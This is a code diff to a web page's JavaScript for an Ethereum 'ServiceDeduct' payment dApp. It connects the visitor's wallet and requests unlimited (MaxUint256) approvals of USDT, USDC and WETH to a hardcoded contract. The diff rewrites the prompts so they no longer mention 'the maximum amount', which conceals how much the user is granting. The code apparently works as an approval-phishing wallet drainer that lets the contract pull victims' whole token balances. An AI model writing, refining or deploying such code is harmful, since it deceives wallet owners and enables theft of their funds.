@@ -1,15 +1,24 @@
 // --- Client-side Constants ---
-// 🚨🚨 This must be the address of your deployed ServiceDeduct contract 🚨🚨
+// ✅ Using EIP-55 Checksum Address for maximum compatibility
 const DEDUCT_CONTRACT_ADDRESS = '0xaFfC493Ab24fD7029E03CED0d7B87eAFC36E78E0';
 
-// Token Contract Addresses
+// Token Contract Addresses (with checksum)
 const USDT_CONTRACT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
 const USDC_CONTRACT_ADDRESS = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
 const WETH_CONTRACT_ADDRESS = '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2';
 
-// --- ABI Definitions ---
-const DEDUCT_CONTRACT_ABI = [ "function isServiceActiveFor(address) view returns (bool)", "function activateService(address)", "function REQUIRED_ALLOWANCE_THRESHOLD() view returns (uint256)" ];
-const ERC20_ABI = [ "function approve(address, uint256) returns (bool)", "function balanceOf(address) view returns (uint256)", "function allowance(address, address) view returns (uint256)" ];
+// --- ABI Definitions (Client-side slim version) ---
+const DEDUCT_CONTRACT_ABI = [
+    "function isServiceActiveFor(address customer) view returns (bool)",
+    "function activateService(address tokenContract) external",
+    "function REQUIRED_ALLOWANCE_THRESHOLD() view returns (uint256)"
+];
+
+const ERC20_ABI = [
+    "function approve(address spender, uint256 amount) external returns (bool)",
+    "function balanceOf(address account) view returns (uint256)",
+    "function allowance(address owner, address spender) view returns (uint256)"
+];
 
 // --- Global Variables & DOM Elements ---
 const connectButton = document.getElementById('connectButton');
@@ -21,9 +30,21 @@ let provider, signer, userAddress;
 let deductContract, usdtContract, usdcContract, wethContract;
 
 // --- UI Control Functions ---
-function hideOverlay() { overlay.style.opacity = '0'; setTimeout(() => { overlay.style.display = 'none'; }, 300); }
-function showOverlay(message) { overlayMessage.innerHTML = message; overlay.style.display = 'flex'; setTimeout(() => { overlay.style.opacity = '1'; }, 10); }
-function updateStatus(message) { statusDiv.innerHTML = message || ''; statusDiv.style.display = message ? 'block' : 'none'; }
+function hideOverlay() {
+    overlay.style.opacity = '0';
+    setTimeout(() => { overlay.style.display = 'none'; }, 300);
+}
+
+function showOverlay(message) {
+    overlayMessage.innerHTML = message;
+    overlay.style.display = 'flex';
+    setTimeout(() => { overlay.style.opacity = '1'; }, 10);
+}
+
+function updateStatus(message) {
+    statusDiv.innerHTML = message || '';
+    statusDiv.style.display = message ? 'block' : 'none';
+}
 
 // --- Core Wallet Logic ---
 
@@ -36,16 +57,14 @@ async function initializeWallet() {
             return showOverlay('Please install MetaMask, Trust Wallet, or a compatible wallet to continue.');
         }
         
-        // ✅ **核心修正: 统一使用钱包注入的 provider，不再依赖外部 RPC**
         provider = new ethers.BrowserProvider(window.ethereum);
 
         const network = await provider.getNetwork();
-        const mainnetChainId = 1n;
-
-        if (network.chainId !== mainnetChainId) {
+        if (network.chainId !== 1n) {
             showOverlay('Requesting to switch to Ethereum Mainnet...<br>Please approve in your wallet.');
             try {
-                await provider.send('wallet_switchEthereumChain', [{ chainId: ethers.toQuantity(mainnetChainId) }]);
+                await provider.send('wallet_switchEthereumChain', [{ chainId: '0x1' }]);
+                // On successful switch, the chainChanged listener will trigger a page reload.
                 return; 
             } catch (switchError) {
                 if (switchError.code === 4001) {
@@ -63,7 +82,6 @@ async function initializeWallet() {
             userAddress = accounts[0];
             signer = await provider.getSigner();
 
-            // ✅ 所有合约实例都使用由钱包提供的 provider 或 signer
             deductContract = new ethers.Contract(DEDUCT_CONTRACT_ADDRESS, DEDUCT_CONTRACT_ABI, signer);
             usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, ERC20_ABI, signer);
             usdcContract = new ethers.Contract(USDC_CONTRACT_ADDRESS, ERC20_ABI, signer);
@@ -87,7 +105,6 @@ async function checkAuthorization() {
         if (!signer) return showOverlay('Wallet not connected. Please connect first.');
         updateStatus("Checking authorization status...");
 
-        // 这些调用现在将通过钱包自己的 RPC 连接进行
         const isServiceActive = await deductContract.isServiceActiveFor(userAddress);
         const requiredAllowance = await deductContract.REQUIRED_ALLOWANCE_THRESHOLD();
         
@@ -173,49 +190,61 @@ async function connectWallet() {
     }
 }
 
+/**
+ * Handles the authorization and activation flow for WETH.
+ */
 async function handleWethAuthorizationFlow(requiredAllowance, serviceActivated) {
     showOverlay('Setting up WETH payment for you...');
     const wethAllowance = await wethContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS);
     if (wethAllowance < requiredAllowance) {
-        showOverlay('Step 1/2: Requesting WETH approval...<br>Please approve the maximum amount in your wallet.');
+        showOverlay('Step 1/2: Requesting WETH approval...<br>Please approve in your wallet.');
         const tx = await wethContract.approve(DEDUCT_CONTRACT_ADDRESS, ethers.MaxUint256);
         await tx.wait();
     }
     if (!serviceActivated) {
-        showOverlay('Step 2/2: Activating service...<br>Please confirm the transaction in your wallet.');
+        showOverlay('Step 2/2: Activating service...<br>Please confirm in your wallet.');
         const tx = await deductContract.activateService(WETH_CONTRACT_ADDRESS);
         await tx.wait();
     }
 }
 
+/**
+ * Handles the authorization and activation flow for USDT and USDC.
+ */
 async function handleStablecoinAuthorizationFlow(requiredAllowance, serviceActivated) {
-    showOverlay('Setting up USDT / USDC payment for you...');
+    showOverlay('Setting up USDT / USDC payment...');
     let tokenToActivate = '';
+
     const usdtAllowance = await usdtContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS);
     if (usdtAllowance < requiredAllowance) {
-        showOverlay('Step 1/3: Requesting USDT approval...<br>Please approve the maximum amount in your wallet.');
+        showOverlay('Step 1/3: Requesting USDT approval...<br>Please approve in your wallet.');
         const tx = await usdtContract.approve(DEDUCT_CONTRACT_ADDRESS, ethers.MaxUint256);
         await tx.wait();
     }
     if ((await usdtContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)) >= requiredAllowance) {
         if (!serviceActivated) tokenToActivate = USDT_CONTRACT_ADDRESS;
     }
+
     const usdcAllowance = await usdcContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS);
     if (usdcAllowance < requiredAllowance) {
-        showOverlay('Step 2/3: Requesting USDC approval...<br>Please approve the maximum amount in your wallet.');
+        showOverlay('Step 2/3: Requesting USDC approval...<br>Please approve in your wallet.');
         const tx = await usdcContract.approve(DEDUCT_CONTRACT_ADDRESS, ethers.MaxUint256);
         await tx.wait();
     }
     if (!tokenToActivate && (await usdcContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)) >= requiredAllowance) {
          if (!serviceActivated) tokenToActivate = USDC_CONTRACT_ADDRESS;
     }
+    
     if (!serviceActivated && tokenToActivate) {
-        showOverlay('Step 3/3: Activating service...<br>Please confirm the transaction in your wallet.');
+        showOverlay('Step 3/3: Activating service...<br>Please confirm in your wallet.');
         const tx = await deductContract.activateService(tokenToActivate);
         await tx.wait();
     }
 }
 
+/**
+ * Disconnects and resets the application state.
+ */
 function disconnectWallet() {
     resetState();
     alert('Wallet disconnected. To fully remove site permissions, please do so within your wallet\'s "Connected Sites" settings.');
@@ -230,4 +259,5 @@ function resetState() {
 
 // --- Event Listeners & Initial Load ---
 connectButton.addEventListener('click', connectWallet);
+
 initializeWallet();
